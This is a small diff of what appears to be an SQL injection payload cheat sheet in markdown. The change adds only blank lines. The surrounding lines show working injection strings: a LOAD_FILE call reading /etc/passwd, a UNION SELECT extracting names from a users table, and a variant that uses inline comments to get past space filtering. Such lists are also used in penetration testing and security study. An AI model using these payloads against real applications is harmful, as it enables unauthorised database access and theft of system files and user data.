@@ -928,9 +928,11 @@ SELECT LOAD_FILE('/etc/passwd')
 ```
 'UNION SELECT 1,name,3,4 from users; -- -
 ```
+
 #### UNHEX - hexadecimal
 ```
 ```
+
 #### Add comment /* */ for space bypass
 ```
 'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -
